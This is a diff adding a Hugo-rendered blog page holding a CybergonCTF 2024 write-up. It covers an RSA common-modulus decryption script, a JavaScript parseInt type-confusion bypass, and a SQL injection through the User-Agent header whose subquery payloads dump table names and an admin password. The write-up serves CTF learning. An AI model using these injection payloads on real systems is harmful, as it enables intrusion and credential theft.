@@ -1,0 +1,456 @@
+<!doctype html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html
+  class="not-ready lg:text-base"
+  style="--bg: #faf8f1"
+  lang="en-us"
+>
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <meta charset="utf-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta
+    name="viewport"
+    content="width=device-width, initial-scale=1, shrink-to-fit=no"
+  />
+
+  
+  <title>CybergonCTF writeup - Tech101</title>
+
+  
+  <meta name="theme-color" />
+
+  
+  
+  
+  
+  <meta name="description" content="some challenge." />
+  <meta name="author" content="17wss" />
+  
+
+  
+  
+  
+  
+  
+  
+  <link rel="preload stylesheet" as="style" href="http://localhost:1313/main.min.css" />
+
+  
+  
+  
+  
+  
+  <link rel="preload" as="image" href="http://localhost:1313/theme.svg" />
+
+  
+  
+  
+  
+  <link rel="preload" as="image" href="https://raw.githubusercontent.com/leo950413/leo950413.github.io/refs/heads/master/3.jpg" />
+  
+  
+
+  
+  
+  <link rel="preload" as="image" href="http://localhost:1313/github.svg" />
+  
+  
+
+  
+  
+
+  
+  
+  
+  
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.css"
+  integrity="sha384-3UiQGuEI4TTMaFmGIZumfRPtfKQ3trwQE2JgosJxCnGmQpL/lJdjpcHkaaFwHlcI"
+  crossorigin="anonymous"
+/>
+<script
+  defer
+  src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/katex.min.js"
+  integrity="sha384-G0zcxDFp5LWZtDuRMnBkk3EphCK1lhEf4UEyEM693ka574TZGwo4IWwS6QLzM/2t"
+  crossorigin="anonymous"
+></script>
+<script
+  defer
+  src="https://cdn.jsdelivr.net/npm/katex@0.16.7/dist/contrib/auto-render.min.js"
+  integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05"
+  crossorigin="anonymous"
+></script>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', () =>
+    renderMathInElement(document.body, {
+      
+      
+      delimiters: [
+        { left: '$$', right: '$$', display: true },
+        { left: '$', right: '$', display: false },
+      ],
+      
+      throwOnError: false,
+    }),
+  );
+</script>
+
+  
+  
+  
+
+  
+  <link rel="icon" href="http://localhost:1313/favicon.ico" />
+  <link rel="apple-touch-icon" href="http://localhost:1313/apple-touch-icon.png" />
+
+  
+  <meta name="generator" content="Hugo 0.128.2">
+
+  
+  
+  
+</head>
+
+  <body class="text-black duration-200 ease-out dark:text-white">
+    <header class="mx-auto flex h-[4.5rem] max-w-3xl px-8 lg:justify-center">
+  <div class="relative z-50 mr-auto flex items-center">
+    <a
+      class="-translate-x-[1px] -translate-y-[1px] text-2xl font-semibold"
+      href="http://localhost:1313/"
+      >Tech101</a
+    >
+    <div
+      class="btn-dark text-[0] ml-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.svg)_left_center/cover_no-repeat] dark:invert dark:[background-position:right]"
+      role="button"
+      aria-label="Dark"
+    ></div>
+  </div>
+
+  <div
+    class="btn-menu relative z-50 -mr-8 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden"
+    role="button"
+    aria-label="Menu"
+  ></div>
+
+  
+
+  <script>
+    
+    const htmlClass = document.documentElement.classList;
+    setTimeout(() => {
+      htmlClass.remove('not-ready');
+    }, 10);
+
+    
+    const btnMenu = document.querySelector('.btn-menu');
+    btnMenu.addEventListener('click', () => {
+      htmlClass.toggle('open');
+    });
+
+    
+    const metaTheme = document.querySelector('meta[name="theme-color"]');
+    const lightBg = '#faf8f1'.replace(/"/g, '');
+    const setDark = (isDark) => {
+      metaTheme.setAttribute('content', isDark ? '#000' : lightBg);
+      htmlClass[isDark ? 'add' : 'remove']('dark');
+      localStorage.setItem('dark', isDark);
+    };
+
+    
+    const darkScheme = window.matchMedia('(prefers-color-scheme: dark)');
+    if (htmlClass.contains('dark')) {
+      setDark(true);
+    } else {
+      const darkVal = localStorage.getItem('dark');
+      setDark(darkVal ? darkVal === 'true' : darkScheme.matches);
+    }
+
+    
+    darkScheme.addEventListener('change', (event) => {
+      setDark(event.matches);
+    });
+
+    
+    const btnDark = document.querySelector('.btn-dark');
+    btnDark.addEventListener('click', () => {
+      setDark(localStorage.getItem('dark') !== 'true');
+    });
+  </script>
+
+  <div
+    class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full select-none flex-col justify-center pb-16 duration-200 dark:bg-black lg:static lg:h-auto lg:flex-row lg:!bg-transparent lg:pb-0 lg:transition-none"
+  >
+    
+    
+    <nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-6">
+      
+      <a
+        class="block text-center text-2xl leading-[5rem] lg:text-base lg:font-normal"
+        href="/random_post/"
+        >Random post</a
+      >
+      
+    </nav>
+    
+
+    
+    <nav
+      class="mt-12 flex justify-center space-x-10 dark:invert lg:ml-12 lg:mt-0 lg:items-center lg:space-x-6"
+    >
+      
+      <a
+        class="h-8 w-8 text-[0] [background:var(--url)_center_center/cover_no-repeat] lg:h-6 lg:w-6"
+        style="--url: url(./github.svg)"
+        href="https://github.com/leo950413"
+        target="_blank"
+        rel="me"
+      >
+        github
+      </a>
+      
+    </nav>
+    
+  </div>
+</header>
+
+
+    <main
+      class="prose prose-neutral relative mx-auto min-h-[calc(100%-9rem)] max-w-3xl px-8 pb-16 pt-12 dark:prose-invert"
+    >
+      
+
+<article>
+  <header class="mb-16">
+    <h1 class="!my-0 pb-2.5">CybergonCTF writeup</h1>
+
+    
+    <div class="text-sm antialiased opacity-60">
+      
+      <time>Nov 25, 2024</time>
+      
+      
+      
+      
+    </div>
+    
+  </header>
+
+  <section><h1 id="cybergonctf-2024-writeup">CybergonCTF 2024 writeup</h1>
+<h2 id="rsa-1">RSA 1</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> getPrime
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rsa_q <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">512</span>)
+</span></span><span style="display:flex;"><span>rsa_p <span style="color:#f92672">=</span> getPrime(<span style="color:#ae81ff">512</span>)
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> rsa_q <span style="color:#f92672">*</span> rsa_p
+</span></span><span style="display:flex;"><span>exp1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10003</span>
+</span></span><span style="display:flex;"><span>exp2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10001</span>
+</span></span></code></pre></div><p>According to RSA implemntation we get
+$$
+{m ^ {e_1}}\bmod {n} \equiv c_1 \
+m ^{e_2} \bmod{n} \equiv c_2
+$$</p>
+<h3 id="extended-euclidean-algorithm">Extended Euclidean algorithm</h3>
+<p>$$
+x_1<em>e_1 + x_2</em>e_2 = gcd(e_1, e_2)
+$$
+In the given code , we can find that $e_1$ and $e_2$ is coprime , so apply egcd algorithm to solve for coefficient $x_1 , x_2 $.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">egcd</span>(a, b): 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> a <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> : 
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span> b,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>            
+</span></span><span style="display:flex;"><span>   gcd,x1,y1 <span style="color:#f92672">=</span> egcd(b<span style="color:#f92672">%</span>a, a) 
+</span></span><span style="display:flex;"><span>   x <span style="color:#f92672">=</span> y1 <span style="color:#f92672">-</span> (b<span style="color:#f92672">//</span>a) <span style="color:#f92672">*</span> x1 
+</span></span><span style="display:flex;"><span>   y <span style="color:#f92672">=</span> x1 
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">return</span> gcd,x,y 
+</span></span></code></pre></div><h3 id="solve-for-flag">Solve for flag</h3>
+<p>Use $x_1$ and $x_2$ we get the equation</p>
+<p>$$
+m^{e_1<em>c_1}<em>m^{e_2</em>c_2}\bmod  n \equiv m^{e_1</em>c_1+e_2*c_2}\bmod n \equiv m \bmod n
+$$
+If any of the coefficient is negative , just find the multiplicative inverse , which can be easily evaluate by python built-in function <code>pow()</code>.</p>
+<h3 id="solution-code">Solution code</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> long_to_bytes
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>n <span style="color:#f92672">=</span> <span style="color:#ae81ff">157508528276758767638734754424621334466394815259243977959210580239577661657714722726225362774231543920376913579658052494826650164280151836289734452590647102313381584133512835595817708427222746495824286741840967127393187086028742577763080469063534742728547285121808241078515099307495843605080694383425986909029</span>
+</span></span><span style="display:flex;"><span>cip1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">69950256754119187070741220414057295159525964023691737870808579797990094306696842507546591858691032981385348052406246203530192324935867616305070637936848926878022662082401090988631324024964630729510728043900454511012552105883413265919300434674823577232105833994040714469215427142851489025266027204415434792116</span>
+</span></span><span style="display:flex;"><span>cip2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">26975575766224799967239054937673125413993489249748738598424368718984020839138611191333159231531582854571888911372230794559127658721738810364069579050102089465873134218196672846627352697187584137181503188003597560229078494880917705349140663228281705408967589237626894208542139123054938434957445017636202240137</span>
+</span></span><span style="display:flex;"><span>exp1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10003</span>
+</span></span><span style="display:flex;"><span>exp2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x10001</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">egcd</span>(a, b): 
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> a <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span> : 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> b,<span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>             
+</span></span><span style="display:flex;"><span>    gcd,x1,y1 <span style="color:#f92672">=</span> egcd(b<span style="color:#f92672">%</span>a, a) 
+</span></span><span style="display:flex;"><span>    x <span style="color:#f92672">=</span> y1 <span style="color:#f92672">-</span> (b<span style="color:#f92672">//</span>a) <span style="color:#f92672">*</span> x1 
+</span></span><span style="display:flex;"><span>    y <span style="color:#f92672">=</span> x1 
+</span></span><span style="display:flex;"><span>     
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> gcd,x,y 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>s_1, s_2 <span style="color:#f92672">=</span> egcd(exp1 , exp2)[<span style="color:#ae81ff">1</span>:]
+</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> (pow(cip1 , s_1 ,n) <span style="color:#f92672">*</span> pow(cip2 , s_2 , n))<span style="color:#f92672">%</span>n
+</span></span><span style="display:flex;"><span>print(long_to_bytes(m))
+</span></span></code></pre></div><h2 id="trickery-number">Trickery Number</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>      <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">y</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">parsedUrl</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">y</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">y</span> <span style="color:#f92672">==</span> <span style="color:#66d9ef">null</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sendFile</span>(<span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;null.html&#39;</span>));
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">y</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">17</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sendFile</span>(<span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;no-flag.html&#39;</span>));
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">x</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">BigInt</span>(parseInt(<span style="color:#a6e22e">y</span>));
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">x</span> <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">y</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">flag</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#34;flag.txt&#34;</span>, <span style="color:#e6db74">&#39;utf8&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sendFile</span>(<span style="color:#a6e22e">res</span>, <span style="color:#a6e22e">path</span>.<span style="color:#a6e22e">join</span>(<span style="color:#a6e22e">__dirname</span>, <span style="color:#e6db74">&#39;flag.html&#39;</span>), {<span style="color:#a6e22e">flag</span>});
+</span></span><span style="display:flex;"><span>      }
+</span></span></code></pre></div><h3 id="code-analyze">Code Analyze</h3>
+<p>The code first parse query from request to variable $y$ , then parse the string to integer, finally compare their values.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">y</span>); <span style="color:#75715e">// &#39;string&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#66d9ef">typeof</span> <span style="color:#a6e22e">x</span>); <span style="color:#75715e">// &#39;number&#39;
+</span></span></span></code></pre></div><h3 id="parseint-in-depth">parseInt() in depth</h3>
+<p>According to document.</p>
+<blockquote>
+<p>The parseInt function converts its first argument to a string, parses that string, then returns an integer or NaN.</p>
+</blockquote>
+<p>There is a part of text that worth notice.</p>
+<blockquote>
+<p>If the input string, with leading whitespace and possible +/- signs removed, <!-- raw HTML omitted --> begins with 0x or 0X radix is assumed to be 16 <!-- raw HTML omitted -->and the rest of the string is parsed as a hexadecimal number.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>parseInt(<span style="color:#e6db74">&#34;0x10&#34;</span>) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">16</span>
+</span></span></code></pre></div><blockquote>
+<p>Note: Other prefixes like 0b, which are valid in number literals, are treated as normal digits by parseInt().</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>parseInt(<span style="color:#e6db74">&#34;0b10&#34;</span>) <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#ae81ff">0</span>
+</span></span></code></pre></div><h3 id="javascript-comparison">Javascript comparison</h3>
+<p>When comparing a string with a number, JavaScript will convert the string to a number.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span><span style="color:#e6db74">&#34;123&#34;</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">122</span> <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;0x123&#34;</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">123</span> <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#66d9ef">true</span>
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;0b11&#34;</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">11</span> <span style="color:#960050;background-color:#1e0010">#</span> <span style="color:#66d9ef">false</span>
+</span></span></code></pre></div><p>So we know that the conversion when comparing can handle 0b prefix , so input 0b + any number will pass the check.</p>
+<h2 id="agent">Agent</h2>
+<p><img src="image.png" alt="picture">
+We don&rsquo;t have the source code for this challenge. After conducting some tests, we discovered that when we log in to the website, it writes the login record to a log file, including the IP address and the user agent. This allows us to control the user agent and attempt to inject something.</p>
+<p>When I changed the user agent to abc&rsquo;, it triggered the following error:</p>
+<pre tabindex="0"><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;111.242.10.2&#39;)&#39; at line 1
+</code></pre><p>This led me to suspect a possible SQL injection vulnerability. I tried injecting some queries, but it kept showing the same syntax error.</p>
+<p>After some thought, I hypothesized that the original source code might look like this:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> log_table <span style="color:#66d9ef">VALUES</span> (<span style="color:#e6db74">&#39;..&#39;</span> , <span style="color:#e6db74">&#39;User agent&#39;</span> ,  <span style="color:#e6db74">&#39;ip&#39;</span>)
+</span></span></code></pre></div><p>Based on this, I used a subquery to inspect the database structure:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> log_table VALUE (<span style="color:#e6db74">&#39;..&#39;</span> , <span style="color:#e6db74">&#39;&#39;</span> , ((<span style="color:#66d9ef">SELECT</span> <span style="color:#66d9ef">table_name</span> <span style="color:#66d9ef">FROM</span> INFORMATION_SCHEMA.TABLES  <span style="color:#66d9ef">LIMIT</span>  <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>) <span style="color:#75715e">-- &#39;)
+</span></span></span></code></pre></div><p>Eventually, I found the admin account and retrieved the flag with the following query:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#66d9ef">INSERT</span> <span style="color:#66d9ef">INTO</span> log_table VALUE (<span style="color:#e6db74">&#39;..&#39;</span> , <span style="color:#e6db74">&#39;&#39;</span> , (<span style="color:#66d9ef">SELECT</span> password <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span> <span style="color:#66d9ef">limit</span> <span style="color:#ae81ff">0</span>,<span style="color:#ae81ff">1</span>)<span style="color:#75715e">-- &#39;)
+</span></span></span></code></pre></div></section>
+
+  
+  
+  <footer class="mt-12 flex flex-wrap">
+     
+    <a
+      class="mb-1.5 mr-1.5 rounded-lg bg-black/[3%] px-5 py-1.5 no-underline dark:bg-white/[8%]"
+      href="http://localhost:1313/tags/ctf-writeup"
+      >CTF writeup</a
+    >
+    
+  </footer>
+  
+
+  
+  
+
+  
+  
+
+  
+  
+
+  
+
+
+  
+  <div class="giscus mt-24"></div>
+  <script
+    src="https://giscus.app/client.js"
+    data-repo="leo950413/leo950413.github.io"
+    data-repo-id="R_kgDOMVSClg"
+    data-category="General"
+    data-category-id="DIC_kwDOMVSCls4CkejD"
+    data-mapping="url"
+    data-strict="1"
+    data-reactions-enabled="0"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="noborder_dark"
+    data-lang="zh-CN"
+    data-loading="lazy"
+    crossorigin="anonymous"
+    async
+  ></script>
+  
+</article>
+
+
+    </main>
+
+    <footer
+  class="opaco mx-auto flex h-[4.5rem] max-w-3xl items-center px-8 text-[0.9em] opacity-60"
+>
+  <div class="mr-auto">
+    &copy; 2024
+    <a class="link" href="http://localhost:1313/">Tech101</a>
+  </div>
+  <a class="link mx-6" href="https://gohugo.io/" rel="noopener" target="_blank"
+    >Powered by Hugo️️</a
+  >️
+  <a
+    class="link"
+    href="https://github.com/nanxiaobei/hugo-paper"
+    rel="noopener"
+    target="_blank"
+    >✎ Paper</a
+  >
+</footer>
+
+  </body>
+</html>
